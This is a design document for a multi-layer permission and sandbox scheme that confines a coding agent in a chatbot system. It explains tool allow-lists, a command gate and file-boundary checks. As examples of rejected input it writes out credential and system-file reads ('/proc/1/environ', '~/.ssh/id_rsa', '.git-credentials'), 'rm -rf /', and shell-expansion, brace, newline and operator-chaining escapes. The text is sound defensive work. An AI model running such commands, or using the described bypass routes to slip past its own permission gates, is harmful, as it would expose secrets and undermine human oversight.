# Agent Permission Design

This document describes AIr-Friends' multi-layer permission model for controlling what the external ACP Agent (OpenCode CLI) can do during a session.

## Table of Contents

- [Design Principles](#design-principles)
- [Permission Layers Overview](#permission-layers-overview)
- [Layer 1 — OpenCode Agent Mode](#layer-1--opencode-agent-mode)
- [Layer 2 — OpenCode Permission Configuration](#layer-2--opencode-permission-configuration)
- [Layer 3 — ACP Client Permission Gate](#layer-3--acp-client-permission-gate)
- [Layer 4 — File Access Boundary](#layer-4--file-access-boundary)
- [Layer 5 — Sandbox Isolation](#layer-5--sandbox-isolation)
- [YOLO Mode](#yolo-mode)
- [Per-Session-Type Permission Behavior](#per-session-type-permission-behavior)
- [Skill Auto-Approve List](#skill-auto-approve-list)
- [Permission Audit Logging](#permission-audit-logging)
- [Security Considerations](#security-considerations)
- [Configuration Reference](#configuration-reference)

---

## Design Principles

AIr-Friends is a **non-interactive** system — there is no human operator to approve or reject permission prompts during an agent session. This drives several key design choices:

1. **Default-deny**: Unknown tool calls and commands are rejected, not queued for approval.
2. **Defense in depth**: Permissions are enforced at multiple independent layers. Even if one layer is misconfigured, others prevent unauthorized access.
3. **Whitelist-only in restricted mode**: Only known skills and safe commands are auto-approved; everything else is rejected.
4. **Minimal privilege**: The agent receives only the environment variables and tools it needs.
5. **Per-channel granularity**: YOLO mode (all-approve) can be selectively enabled for trusted accounts/channels while the rest of the system runs in restricted mode.

---

## Permission Layers Overview

```text
┌───────────────────────────────────────────────────────────────────┐
│ Layer 1: OpenCode Agent Mode                                      │
│ (build vs. yolo agent selected via ACP setSessionMode)            │
├───────────────────────────────────────────────────────────────────┤
│ Layer 2: OpenCode Permission Configuration (opencode.json)        │
│ (fine-grained allow/deny per tool & pattern)                      │
├───────────────────────────────────────────────────────────────────┤
│ Layer 3: ACP Client Permission Gate                               │
│ (ChatbotClient.requestPermission() — whitelist-based approval)    │
├───────────────────────────────────────────────────────────────────┤
│ Layer 4: File Access Boundary                                     │
│ (readTextFile/writeTextFile path validation)                      │
├───────────────────────────────────────────────────────────────────┤
│ Layer 5: Sandbox Isolation                                        │
│ (Env filtering + filesystem confinement + egress mediation)       │
└───────────────────────────────────────────────────────────────────┘
```

When the external Agent requests any action, it must pass **all applicable layers**. A denial at any layer blocks the operation.

> **Important — how Layer 2 and Layer 3 interact (F12).** Layer 2 is evaluated _first_, and an `"allow"` verdict there is **self-authorizing**: OpenCode executes the tool and returns _without_ ever sending a `session/request_permission` to the ACP client, so **Layer 3 never runs for an `"allow"`ed tool**. Only a `"deny"` (blocks) or an `"ask"` (forwards to Layer 3) leaves the final decision to this repo's gate. Consequently, any filesystem-touching bash tool must be configured `"ask"`, not `"allow"` — otherwise the Layer-3 boundary is dead code for it and an attacker-controlled command such as `head /proc/1/environ` would self-authorize at Layer 2. All such tools are `"ask"` (see [Bash Permission](#bash-permission-whitelist) below).

---

## Layer 1 — OpenCode Agent Mode

OpenCode's tool exposure is governed by which **agent** the session runs as. AIr-Friends defines two agents in `agent-config/opencode.json` and selects between them via the ACP `setSessionMode()` call — there is no CLI flag that restricts individual tools.

| Mode       | OpenCode Agent    | Permission Default        | Selected via                 |
| ---------- | ----------------- | ------------------------- | ---------------------------- |
| Restricted | `build` (default) | `"*": "deny"` + whitelist | Default agent (no override)  |
| YOLO       | `yolo`            | `"*": "allow"`            | ACP `setSessionMode("yolo")` |

### Restricted Mode (`build` agent)

In restricted mode, the session runs as the default `build` agent. All permissions are configured through `opencode.json` (see [Layer 2](#layer-2--opencode-permission-configuration)): the default `"*"` is `deny`, read-only tools are allowed, `edit` is delegated to Layer 3 via `"ask"`, and `bash` uses a specific allow-list. No tool restriction is applied at the CLI level.

### YOLO Mode (`yolo` agent)

In YOLO mode, the system switches to the `yolo` agent via ACP `setSessionMode("yolo")`. This agent has `"*": "allow"` permissions, so every tool is available and all actions are auto-approved internally — with one explicit per-agent exception: `"lsp": "deny"` (decision 5, row 17; see [LSP Disabled: All-Off](#lsp-disabled-all-off-decision-5-row-17)).

**Reference**: `src/acp/agent-factory.ts`

---

## LSP Disabled: All-Off (Decision 5, Row 17)

Per the approved-design decision 5 (row 17, `disable-restricted-agent-lsp`), the LSP capability is **disabled entirely — both agents, both modes** — and the change deliberately records what its carriers do and do not prove.

| Carrier                                                     | Where                                                                                    | What it denies                                                                                                                                           |
| ----------------------------------------------------------- | ---------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--no-lsp` launch flag                                      | OMP factory, **both** modes (`src/acp/agent-factory.ts`, exactly once per launch)        | Native `enableLsp: false` for the session: no `lsp` tool registration, no LSP writethrough/format/diagnostics on edit/write, no startup server discovery |
| `lsp.enabled: false` settings pin                           | `agent-config/omp/restricted.yml` (row-8 owned, unchanged by row 17)                     | Restricted-mode settings-level LSP posture beneath the flag                                                                                              |
| `"lsp": "deny"` per-agent permission                        | `agent-config/opencode.json` — **build and yolo both**, explicitly                       | OpenCode's `lsp` tool through each agent's permission map                                                                                                |
| `deny-lsp` / `deny-lsp-config` + `lsp-adjacent` route pairs | Restricted tool inventory (`src/acp/omp/tool-inventory.ts`, row 14; unchanged by row 17) | Restricted-session decision-layer admission of the `lsp` name and any shape-keyed LSP-adjacent route                                                     |

Deliberate exclusions: **no top-level/global OpenCode LSP clamp** (a global setting would also clamp yolo, which decision 5 rejects), **no OpenCode version bump** (1.18.21 stays), and the native-YOLO settings-level pin is owned by row 25 (`pin-omp-yolo-lsp-settings`) — row 17 does not touch `agent-config/omp/native-yolo.yml`.

**Evidence limits (honest record, both limits distinct):**

1. **Explicit tool denial ≠ implicit-startup suppression.** The per-agent OpenCode `"lsp": "deny"` stops the `lsp` **tool's** permission ask. It does not establish that OpenCode's automatic diagnostics machinery (server boot keyed by the global-only `lsp` config and per-file `touchFile` paths) never starts a language server: at the pinned 1.18.21 tree that mechanism is global-only and cannot scope startup to a named agent, so boundary 5b stays recorded `incompatible`. On OMP, boundary 5a stays `unresolved`: `--no-lsp` disables background discovery and the consultable cold-start routes, but the audit cannot rule out every lazy path from static wiring.
2. **Carrier wiring ≠ native server suppression proof.** All of the above is configuration/wiring evidence. Whether any language-server process actually starts on a real host in each of the four agent/mode combinations (OpenCode build, OpenCode yolo, OMP restricted, OMP native-YOLO) remains **user runtime-observed and UNVERIFIED** (see `docs/OMP_COMPATIBILITY.md` runtime checklist). No mock or unit test in this repo certifies native suppression.

The native-internal OMP hardcoded LSP sessions recorded by the audit (`cleanse/agent.ts`, `security/coordinator.ts`) construct their own `enableLsp: true` sessions and are reachable only through surfaces with no consultable restricted-session tool name, so they stay deny-by-absence at the decision layer rather than becoming new inventory rows; the decision-5 disposition is independent of whether native support exists at all.

---

## Layer 2 — OpenCode Permission Configuration

OpenCode uses a JSON configuration file (`opencode.json`) for fine-grained, per-tool and per-pattern permission control. This is the primary permission layer for restricted-mode (`build` agent) sessions.

> **Reference**: [OpenCode Permissions Documentation](https://opencode.ai/docs/permissions/)

### Pattern Matching Rules

OpenCode's pattern matching uses a **regex-based engine**, not standard glob. Patterns are converted to regular expressions via the following transformation:

1. Special regex characters (`. + ^ $ { } ( ) | [ ] \`) are escaped
2. `*` is converted to `.*` (matches any characters **including** `/` — crosses directory boundaries)
3. `?` is converted to `.` (matches exactly one character)

| Feature        | Behavior                                                                                                                                 |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `*`            | Matches any characters **including path separators** (`/`). Unlike standard glob where `*` only matches within a single directory level. |
| `**`           | Functionally equivalent to `*` (since `*` already crosses directories).                                                                  |
| `?`            | Matches exactly one character.                                                                                                           |
| `~`            | ✅ Expanded to user home directory.                                                                                                      |
| `$HOME`        | ✅ Expanded to user home directory.                                                                                                      |
| `${HOME}`      | ❌ **Not expanded** — braces are regex-escaped to literal characters.                                                                    |
| Other env vars | ❌ Not supported (`$TMPDIR`, `$AGENT_WORKSPACE`, etc. are not expanded).                                                                 |
| `{a,b}`        | ❌ Brace expansion not supported — braces are escaped as literal characters.                                                             |
| Rule priority  | **Last-match-wins** — rules are evaluated in order; the last matching rule takes precedence.                                             |

> **Important**: Because only `~` and `$HOME` are expanded, all permission patterns in `opencode.json` must use either **absolute paths** (e.g., `/app/data/agent-workspace/**/*.md`) or **`~`/`$HOME`-relative paths** (e.g., `~/.agents/skills/**`). Other environment variables will be treated as literal strings and never match real file paths.

> **Reference**: [OpenCode wildcard.ts](https://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/util/wildcard.ts), [OpenCode next.ts](https://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/permission/next.ts)

#### Path Resolution in Permission Patterns

OpenCode's `edit`/`write` tools convert absolute file paths to **relative paths** before evaluating permission rules. The relative path is computed via `path.relative(Instance.worktree, filepath)`, where `worktree` is the agent's current working directory (cwd).

This means **absolute path patterns in the `edit` permission section will never match**, because the actual path being evaluated is relative (e.g., `notes/topic.md` instead of `/app/data/agent-workspace/notes/topic.md`).

This behavior is specific to the `edit` permission — other permissions (e.g., `bash`, `external_directory`) may handle paths differently.

> **Reference**: [OpenCode edit.ts](https://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/tool/edit.ts), [OpenCode write.ts](https://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/tool/write.ts)

### Current Configuration

The `agent-config/opencode.json` in the project configures permissions for the `build` agent (OpenCode's primary agent):

| Category                                               | Permission        | Rationale                                                                                                                   |
| ------------------------------------------------------ | ----------------- | --------------------------------------------------------------------------------------------------------------------------- |
| **Default (`*`)**                                      | `deny`            | Non-interactive system rejects unknowns                                                                                     |
| **Read-only tools** (`read`, `list`, `glob`, `grep`)   | `allow`           | Safe exploration — no side effects                                                                                          |
| **LSP tool** (`lsp`)                                   | `deny` (explicit) | LSP disabled in all agents/modes (decision 5, row 17; see [LSP Disabled: All-Off](#lsp-disabled-all-off-decision-5-row-17)) |
| **Session management** (`todoread`, `todowrite`)       | `allow`           | Internal agent organization tools                                                                                           |
| **Sub-task spawning** (`task`)                         | `deny`            | Non-interactive system — no sub-agent coordination                                                                          |
| **Skills** (`skill`)                                   | `allow`           | Core SKILL.md discovery and loading                                                                                         |
| **Web access** (`webfetch`, `websearch`, `codesearch`) | `allow`           | Research and information gathering                                                                                          |
| **Interactive** (`question`)                           | `deny`            | No human operator to answer questions                                                                                       |
| **Loop protection** (`doom_loop`)                      | `deny`            | Prevent infinite retry loops                                                                                                |
| **File editing** (`edit`)                              | `ask` (delegated) | Delegated to Layer 3 via `"ask"` (see below)                                                                                |
| **Shell commands** (`bash`)                            | Whitelist         | Specific patterns only (see below)                                                                                          |
| **External directories**                               | Restricted        | Skills and agent workspace only                                                                                             |

### Edit Permission (Delegated via `"ask"`)

File editing is delegated to Layer 3 (ChatbotClient) via the `"ask"` permission:

```json
"edit": "ask"
```

The `"ask"` value causes OpenCode to forward the permission decision to the ACP `requestPermission()` callback (Layer 3), rather than evaluating it internally at Layer 2. This is necessary because OpenCode's `edit`/`write` tools convert file paths to relative paths before evaluating permission rules (see [Path Resolution in Permission Patterns](#path-resolution-in-permission-patterns)), which makes absolute path patterns in `opencode.json` unreliable.

The `write`, `patch`, and `multiedit` tools all use `permission: "edit"`, so this single rule covers all file-editing operations.

**Edit/Write Permission Flow (Restricted Mode):**

1. **Layer 2** → `"edit": "ask"` delegates the decision to Layer 3
2. **Layer 3** → `ChatbotClient.requestPermission()` checks workspace boundary (agent workspace + TMPDIR) and file extension (`allowedWriteExtensions`)
3. **Layer 4** → `writeTextFile()` enforces path boundary and extension checks as defense-in-depth

### Bash Permission (Whitelist)

Shell commands use default-deny. Skill-invocation patterns are `"allow"` (Layer 3 matches them by entrypoint). **Every filesystem-touching utility is `"ask"`, not `"allow"`** (F12 D1), so its execution is forwarded to the Layer-3 gate rather than self-authorized at Layer 2:

| Pattern                                                                                 | Verdict | Purpose / rationale                                                                           |
| --------------------------------------------------------------------------------------- | ------- | --------------------------------------------------------------------------------------------- |
| `deno run *skills/*/scripts/*.ts*`, `*/skills/*/scripts/*.ts*`                          | `allow` | Skill scripts; Layer 3 verifies the invocation entrypoint                                     |
| `rg`, `cat`, `head`, `tail`, `ls`, `find`, `wc`, `file`, `tree`, `jq`                   | `ask`   | Search/read utilities — routed to the Layer-3 generic-command gate                            |
| `pdftotext`, `pdfinfo`, `pdfimages`, `pandoc`, `exiftool`, `ffprobe`                    | `ask`   | Document/metadata readers — routed to the Layer-3 gate                                        |
| `ffmpeg`, `magick`, `convert`, `identify`, `mogrify`, `pdftoppm`, `unzip`, `zip`, `7zz` | `ask`   | Media/archive tools that also **write** — routed to the gate (output paths confined too)      |
| `agent-browser *`                                                                       | `ask`   | Browser automation — `file://` args rejected by the gate (D3); network egress mediated by F14 |
| `bc`, `zola`                                                                            | `deny`  | Dropped — not needed by the agent (a calculator / static-site generator)                      |
| `git`, `python`, `echo`, `mkdir`, `rm`, `mv`, `dd`, `chmod`, `strace`, `gcc`, `make`    | `deny`  | Interpreters / mutating system tools — never routed to the generic allow-list                 |

**Layer-3 generic-command gate (F12 D2).** Utilities configured `"ask"` reach `requestPermission()`. The restricted gate in `src/acp/command-path-policy.ts` requires an entrypoint on `GENERIC_COMMAND_ALLOWLIST` and canonical physical membership for every argument, including read inputs and prospective output targets. Known tokens expand before metadata observation; new targets use their canonical existing ancestor. Parent-directory and final-file links to external files or sibling workspaces are denied. Contained links can be approved on their canonical destinations.

The command-only grants are the canonical session workspace (including its TMPDIR/staging), the configured shared Agent workspace, an existing canonical `processTmpDir` directory in shared-process mode, and the existing canonical OpenCode tool-output directory. Per-spawn tool-output must be physically inside the session workspace; shared-mode tool-output must be inside the pool-key data home under `opencode-data`. Its grant covers that directory only, never sibling directories. The home-rooted `~/.local/share/opencode/tool-output` receives no grant. These extra roles never enter the structured filesystem sinks.

The canonical OpenCode data root is an isolation boundary with no access grant. Any target inside it must also be inside this session's canonical data home, even when a broader workspace grant or an alias would otherwise admit it. Sibling/previous data homes and data-root enumeration are denied. Missing tool-output omits that role without invalidating unrelated workspace decisions; prospective outputs beneath the workspace keep their inherited verdict.

Missing authoritative session context, unavailable required root identity, escaping/dangling/looping links, metadata failures and observed path or session-generation changes fail closed. There is no lexical fallback. Observation failures retain the `path_outside_boundary` decision and historical audit reason while logging the predecessor cause. The complete inherited allow/deny corpus, allow-list, dangerous flags, tokenization, fd redirects, shell operators and per-segment chain rule retain their verdicts. YOLO auto-approves before this gate.

This is decision-time containment. The command still performs native IO, so replacement after approval is not prevented; command-execution confinement remains F12 D4 bwrap scope. Unit/mock acceptance proves permission decisions only, with real-runtime acceptance remaining user-owned. Tool inventory/provenance/MCP decisions (14a), trusted handler wiring (14b), and OMP launch/process state (row 9) are unchanged. Numbered row 15 precedes LSP row 17 on `agent-config/opencode.json`; this change leaves its build permissions and yolo bytes untouched. The successor's build+yolo LSP denies intentionally end local yolo-byte equality, and final regression baselines use the post-row-17 file.

**fd-to-fd redirection tolerance (F12 D1).** A whitespace-delimited argument token that is **exactly** `N>&M` with the source descriptor `M` restricted to a standard stream (`1` or `2`; e.g. `2>&1`, `1>&2`, `3>&1`) is tolerated by the generic gate **and** the skill-whitelist matchers (`matchesScriptPath` / `matchesCommandPrefix`): it duplicates an already-open standard output/error capture pipe and references no path on disk, so it is removed from the shell-operator check and skipped in the path-argument scan. Coding models habitually append `2>&1`, so `ls -la {WS}/tmp/ 2>&1` is approved instead of being misrejected as an out-of-workspace escape. The tolerance is intentionally maximally narrow and provably cannot grant filesystem access:

- File-referencing redirects remain denied: `2>/dev/null`, `2>/tmp/x`, `> file`, `>&word` with a non-numeric `word`, and digit-prefixed filenames a shell opens for writing (`2>&1/tmp/x`, `2>&1x`) are NOT exact `N>&[12]` tokens and still trip the operator check.
- Non-standard source descriptors remain denied: `1>&3`, `2>&3`, `9>&99` could reference a harness-inherited descriptor the gate cannot see.
- Glued operator forms remain denied: `ls x 2>&1 && cat /etc/passwd`, `ls x 2>&1; rm -rf /` — only an UNQUOTED, exact, whitespace-delimited `N>&[12]` token is dropped before the operator check.
- Newline-separated second commands remain denied: only space/tab count as a token separator, so `ls x 2>&1\nrm victim` keeps its `\n` (a shell command separator, not a token boundary) and is rejected — the second command is never reinterpreted as in-workspace path arguments.
- Path containment is unchanged: `ls /etc/passwd 2>&1` is still rejected because the path argument resolves outside the allowed directories.

The real command still executes with the redirection (OpenCode runs the original) — this only relaxes the permission decision for tokens that duplicate an already-open standard stream. When a generic command IS rejected, the WARN and the `permission_denied` audit reason now report the ACTUAL cause — `shell_operator` / `first_token_not_allowed` / `dangerous_flag` / `path_outside_boundary` — instead of always claiming a path escape. The path-outside case keeps the historical audit code `rejected_generic_command_out_of_workspace`; the new causes use `rejected_generic_command_shell_operator`, `rejected_generic_command_first_token_not_allowed`, and `rejected_generic_command_dangerous_flag`. For a multi-command permission request, the FIRST failing command, its index, and its reason are recorded.

**Multi-command `;`/`&&`/`||` chaining (F12 D2).** Coding models habitually batch commands with `;`, `&&`, or `||` to save tool calls. OpenCode's own permission layer already splits such invocations into per-command patterns and routes all-ask chains to this gate as ONE request with the raw command. The gate therefore approves a multi-command invocation **only when EVERY segment independently passes the exact gate it would face as its own tool call** — the skill-whitelist matchers (`matchesScriptPath` / `matchesCommandPrefix`) OR the generic-command gate. This is capability-neutral: each segment could already be run as its own gated tool call, so chaining only removes forced single-command round trips, never grants new capability (shell-state-carrying commands like `cd`/`export`/`eval`/`source`/`exec` fail the first-token allow-list, so a chain cannot smuggle state into later segments).

- **Quote-aware splitting** (`splitCommandSegments`): separators are recognized only OUTSIDE single or double quotes (with shell-correct backslash escapes inside double quotes). An unbalanced quote disables splitting so the whole command is evaluated as one segment (a mis-split can only over-reject, never under-reject, because every segment still passes the full single-command gate). Empty segments are dropped; a command with no separator is evaluated byte-identically to today.
- **Redirect-only segments are operator artifacts**: a segment consisting ONLY of tolerated fd-redirect tokens (e.g. the `2>&1` in a glued `2>&1&&cat ...`) is rejected as `shell_operator`, never skipped — preserving the existing glued-operator rejection semantics.
- **First failing segment reported**: the WARN and the single `permission_denied` audit entry carry the FIRST failing segment's cause, with the failing segment text in the log context (the `messageTemplate` stays `Rejecting generic command: {reason} (command {index} of {total}: {command})` for GELF classification stability).
- **Still rejected, never splitting boundaries**: pipes `|`, backgrounding `&`, newline separators, and file-referencing redirects (`2>/dev/null`, `> file`). Quoted operators (`"a;b"`, `'x > y'`) are literal data and are NOT treated as operators anywhere in the gate.
- **`"||"` / `"&&"` entries in `agent-config/opencode.json` are inert**: OpenCode's tree-sitter segmentation splits chains into per-command patterns and never emits `"||"`/`"&&"` as command patterns, so those deny entries never match. The `echo *` / `curl *` / `git *`-style deny rules, however, DO still block those segments at OpenCode's layer before the ACP gate is ever consulted — `cat x || echo "NO INDEX"` is rejected by OpenCode itself (the `echo` node), which is why the self-research retry prompt teaches the Read-tool pattern instead.

**Shell-expansion token tightening (F12 D5).** The generic gate's command argument policy and the skill matchers' `referencesOutOfWorkspacePath` reject argument tokens whose runtime shell expansion could resolve outside the allowed directories. Only the harness-set variables are expandable/recognized: `$HOME`/`${HOME}`, `$XDG_DATA_HOME`/`${XDG_DATA_HOME}` (expanded and containment-checked), and `$TMPDIR`/`${TMPDIR}`, `$AGENT_WORKSPACE`/`${AGENT_WORKSPACE}`, `$SESSION_ID`/`${SESSION_ID}` (expanded and containment-checked in the generic gate; recognized as known without expansion in the skill matchers, preserving the `--content-file $TMPDIR/$SESSION_ID/x.md` payload contract). Every other UNQUOTED `$VAR`/`${VAR}` reference is rejected (e.g. `cat $IFS/etc/passwd`, `cat ${OTHER}/etc/shadow` — an unquoted expansion can be word-split into an out-of-workspace path), as is any unquoted brace-expansion token (`cat {safe,/etc/passwd}`), any DOUBLE-QUOTED non-harness `$` reference that begins the token's path content (`cat "$X/etc/passwd"`, `cat "$X"`, `--flag="$X"` — an unset variable expands to empty, exposing the literal `/...`/`..` suffix as absolute/traversal; a set variable can carry an absolute value directly), and any backslash-escaped newline (line continuation — bash silently removes `\<newline>`, so `cat \<newline>/etc/passwd` would execute `cat /etc/passwd`) in every quote state. `$`/`{`/`}` inside single quotes are literal and allowed; double-quoted references EMBEDDED after literal text (`"price $X"`, `"a$X"`) are allowed — a literal prefix keeps the expansion relative. Backslashes escape the next character. A known variable whose runtime value is unavailable fails closed (the gate never guesses at an expansion). Tokenization and operator detection are quote-aware (shared `tokenizeShellCommand` / quote-aware `containsShellOperators`).

- **Residual limitation**: embedded double-quoted expansions whose values are operator-controlled paths (e.g. `"a$X/b"` where `$X` is set to a traversal), `$@`/`$*` embedded forms, and other exotic expansions are not modeled; they are documented residual risks (in the filtered subprocess environment unknown variables are unset and expand to empty, so the embedded forms collapse to in-workspace relative paths; operator-configured `allowedEnvVars` values are the operator's own trust choice). The robust long-term fix — routing generic commands through the shell's own parse tree and executing argv without a shell — remains a follow-up.
- **Over-rejection is accepted and documented**: an unquoted `{...}` token that is actually benign (e.g. `rg '{literal'` unquoted, or a jq program without quotes), a token-start double-quoted reference that would expand harmlessly, and a single-quoted newline are rejected; quoting avoids it.

**Session-scoped OpenCode data directory (F12).** The agent subprocess is spawned with `XDG_DATA_HOME` set to `{workspace}/tmp/opencode-data/{sessionId}` (per-session subdir; the workspace-level root for internal system sessions — derived via `sessionXdgDataHome()`), so OpenCode's data dir — including the hard-coded truncated **tool-output** directory (`{xdgData}/opencode/tool-output`) that holds oversized tool results — lands inside the session workspace instead of the shared `~/.local/share/opencode/`. Three properties follow:

- **Session-local tool-output boundary**: canonical observation grants the existing directory only inside the session workspace in per-spawn mode or the pool-key data home in shared mode, as enumerated above. Home-rooted or foreign resolutions receive no role.
- **Cross-session exclusion**: canonical membership in the data-area boundary requires membership in this session's own data home. This applies to aliases and root listings as well as literal paths, overriding broader workspace membership.
- **Harness-set variable expansion**: argument tokens are expanded _after_ quote stripping and `--flag=value` splitting — leading `~`/`~/`, and `$HOME`/`${HOME}`/`$XDG_DATA_HOME`/`${XDG_DATA_HOME}`/`$TMPDIR`/`${TMPDIR}`/`$AGENT_WORKSPACE`/`${AGENT_WORKSPACE}`/`$SESSION_ID`/`${SESSION_ID}` anywhere in the token (values from the caller-provided runtime context) — then containment-checked. `$XDG_DATA_HOME/opencode/tool-output/tool_x` and `$AGENT_WORKSPACE/notes/_index.md` therefore resolve inside the session boundary and are approved, while `~/.ssh/id_rsa`, `$HOME/.git-credentials`, `-o$HOME/...` (attached option values become attached absolute paths and are rejected), attached short-option traversal (`-f../sibling/file`, `-o../x`), unexpandable forms like `~otheruser/...`, unknown unquoted `$VAR` references, and unquoted brace tokens all remain denied.

### External Directory Permission

By default, OpenCode only allows file access within its working directory (the user's workspace). The `external_directory` permission grants access to additional paths:

```json
"external_directory": {
  "*": "deny",
  "~/.agents/skills/**": "allow",
  "/home/deno/.agents/skills/**": "allow",
  "/app/data/agent-workspace/**": "allow",
  "/app/data/workspaces/*/tmp/**": "allow"
}
```

**Reference**: `opencode.json`

---

## Layer 3 — ACP Client Permission Gate

The `ChatbotClient.requestPermission()` method is the core permission callback invoked by the ACP protocol whenever the OpenCode agent requests to perform any action.

### Evaluation Order

The method evaluates permission requests in this order:

1. **YOLO check** — If `config.yolo === true`, auto-approve everything immediately.

1a. **Destructive routing**. Before any title, skill or edit/write location approval, route ACP `delete`/`move` kinds, destructive identities and patch-shaped input through `destructive-policy.ts`. Complete ACP JSON delete (`path`) and move (`source`, `destination`) inputs require matching complete location sets. Native multi-file patches, first-operation-only lists, unknown syntax and missing endpoints fail closed. Titles can trigger this denial route but never supply operation targets.

2. **Trusted skills read**. Approve `read` locations only through canonical observations of the deployment-owned read-only skills root with validated critical-skill references bound to the current registered generation. Keep the `skills_directory_access` audit reason. An unowned HOME-discovered or `npx skills add` copy, a workspace same-name file, an escaping link, stale provenance or missing provenance receives no exception.

3. **Shell command execution** — For `execute` kind requests, evaluate each command SEGMENT-wise (`;`/`&&`/`||` chains are split quote-aware via `splitCommandSegments`): every segment must match the skill auto-approve list using safe token matching (see [Skill Auto-Approve List](#skill-auto-approve-list)) OR pass the generic-command gate (see [Bash Permission (Whitelist)](#bash-permission-whitelist)); the whole invocation is approved only when ALL segments of ALL commands pass, otherwise the FIRST failing segment's cause is reported. The D5 legacy free-text flag check (`--message` / `--content` / `--query` / `--caption`) runs on the FULL original command(s) before any splitting.

4. **Registered skill check** — Extract skill name from `rawInput.skill` or `toolCall.title` and check against the `SkillRegistry`.

5. **Edit/write scoping**. Ordinary `"edit"` kind and legacy title recognition and raw-input path extraction remain unchanged after destructive routing. Every extracted target uses the same canonical write decision as the direct callback. Restricted writes permit the session's own physical staging root `{cwd}/tmp/{Skill API session id}` without an extension filter, or a shared Agent workspace target with `canWriteAgentWorkspace` and an allowed extension (default `.md`, `.txt`; an empty list denies all shared writes). Other ordinary user-workspace targets, including `.md` files, are denied. Trusted skills are read-only in every mode. Missing paths/context, failed observations and stale registrations fail closed.

6. **Default rejection** — All unrecognized tool calls are rejected with `reject_once`.

### Permission Response Options

Destructive approval is all-or-nothing. Every delete target and move source uses an existing-only canonical observation plus the unchanged filesystem write authority. Move destinations and patch mutations in trusted adapter contracts use create/overwrite authority. Every target is evaluated, and the first denied target index identifies the bounded rejection. The normalizer and authorization exports perform no IO and introduce no delete/rename primitive. Missing sources never create parents.

YOLO destructive permission requests retain `yolo_mode` approval. Shared destructive callback policy retains broad physical workspace/shared containment and denies external, sibling, escaping and trusted read-only skills targets in both modes. ACP-mediated decisions do not constrain non-ACP native execution. The generic-command lexical argument gate, dangerous flags and fd-redirect tolerance are unchanged.

The actual P0 type is `DestructiveIntentInput`, including native tool identity, raw input, parser provenance, ordered adapter operations and execution-input binding. Client snapshot consistency relies on the pinned `session/session-tools.ts` permission wrapper sending execution arguments as `rawInput` and preserving `acpApprovedArgs`. Synthetic adapter provenance is never accepted from ACP arguments. Unit/mock/temp-filesystem evidence does not establish native OMP enforcement. User decision register §1a decision 4 permits this fail-closed application while section 3's destructive `incompatible` verdict remains unchanged; runtime acceptance is user-owned. No configuration or environment field changes.

The ACP protocol provides these response options:

- `allow_once` — Approve this specific request
- `reject_once` — Deny this specific request

In restricted mode, the client selects `allow_once` for whitelisted operations and `reject_once` for everything else. There is no "ask user" flow because AIr-Friends operates without human interaction.

**Reference**: `src/acp/client.ts`, lines 161–339

---

## Layer 4 — File Access Boundary

Each callback requires the exact ACP session's explicitly registered context, including its owning Skill API session id and client-assigned generation. Unknown sessions never use a process-cwd or first-session fallback. The pipeline expands session-bound tokens through `filesystem-roots.ts`, constructs canonical roots, observes the target, selects one authorized physical role through `filesystem-policy.ts`, then performs content IO exclusively through `readCanonicalTextFile` or `writeCanonicalTextFile`. A failed step never retries a broader role or ordinary path IO.

Workspace, shared and staging reads retain the case-insensitive `.jsonl`/`.md`/`.txt` allowlist. An optional deployment-owned trusted skills root admits other extensions only after canonical owned-root agreement, critical-skill identity/source/current-generation validation and disjointness from writable roots. It never grants write authority. Lifecycle composition supplies this internal provenance; there is no new operator configuration or environment field. No provenance is synthesized from HOME, filenames or model input. The current composition does not supply cleared native critical-skill evidence, so the trusted exception remains absent there.

Registration generations never repeat: each client instance prefixes its own epoch to a monotonic registration counter, a provenance supplier obtains the value announced for the registration it is about to perform, and supplied critical-skill generations are stored verbatim rather than rebound. A re-registration therefore invalidates every reference minted for an earlier registration, and an `AgentConnector` reconnect — which replays the cached session contexts onto a fresh client — cannot restore that invalidated provenance: the replayed references keep the previous instance's generation and the callbacks deny them (`rejected_trusted_skills_identity`, readTextFile or the restricted read classification) without any content IO.

Restricted writes independently enforce the Layer 3 decision even without a preceding permission request. YOLO callback writes allow any extension under workspace/shared physical containment without shared authorization or staging-only restrictions. Outside/sibling escapes and trusted-skills writes stay denied. These boundaries apply to ACP-delegated IO only; native execution outside ACP is unconstrained by this policy, including native YOLO execution.

Every sink denial records one sanitized bounded reason in the existing retry buffer and audit mirror and raises a static `acp.RequestError` message. No content or raw platform error is emitted.

**Reference**: `src/acp/client.ts`, `src/acp/filesystem-policy.ts`

---

### Secure Canonical Access Primitives (`secure-acp-filesystem-access`)

To prevent TOCTOU races between path validation and content IO, the secure access modules (`src/acp/filesystem-access.ts` and `src/acp/filesystem-access-linux.ts`) provide descriptor-bound UTF-8 read, existing-file overwrite, and exclusive new-file creation:

- **Supported Platform & Architecture**: Linux little-endian x86_64 and aarch64 with GNU glibc (>=2.28), kernel >=5.6 supplying working `openat2` and descriptor `statx`, and Deno FFI permission (`--allow-ffi`). Direct owned system libc locations are used (`/lib/x86_64-linux-gnu/libc.so.6`, `/lib/aarch64-linux-gnu/libc.so.6`); no third-party native package or build step is introduced. Other operating systems or libc layouts fail closed with `unsupported_platform` or `secure_access_unavailable`.
- **Constrained Resolution & Symlinks**: Files are opened beneath the identity-checked canonical root descriptor using `openat2` with `RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS | RESOLVE_NO_MAGICLINKS` and `O_NOFOLLOW`. Request-time parent or final symlinks, including contained symlinks, are strictly rejected (`unsafe_traversal`).
- **Descriptor-Bound Mutation & No Namespace Freezing**: Content operations bind to the opened file descriptor and verify exact `statx` type/identity. This guarantees descriptor binding (an opened file cannot be redirected by pathname substitution), not universal namespace freezing (concurrent same-inode edits or background moves outside ACP are not blocked). Existing overwrite checks type and identity before `ftruncate(fd, 0)`. Replacement entries are never truncated.
- **Exclusive Creation & Existing Parents**: Prospective new files are created exclusively (`O_CREAT | O_EXCL`, mode `0600`). The full path must reside in an already existing parent directory; no recursive `mkdir` is performed (`parent_missing`). Missing or prospective roots return `root_unavailable`.
- **Partial IO & Cleanup**: IO failures return honest `io_failed` results; partial byte transfers do not promise atomic rollback. All descriptors are guaranteed closed on all paths in `finally`.
